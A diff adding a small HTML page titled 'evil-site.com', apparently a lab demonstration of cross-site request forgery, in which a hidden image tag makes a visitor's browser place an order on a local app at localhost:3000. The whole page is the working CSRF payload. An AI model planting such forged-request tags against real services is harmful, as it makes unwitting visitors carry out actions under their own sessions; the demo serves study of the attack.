@@ -1,0 +1,13 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>evil-site.com</title>
+</head>
+<body>
+    <h1>evil-site.com CSRF Attack via Image (works even if Same-Origin-Policy is active)</h1>
+    <!-- CSRF Attack via <img> -->
+    <img src="http://localhost:3000/api/order?name=attacker2&order=High%20Rollers%20Poker" alt="CSRF Attack">
+</body>
+</html>
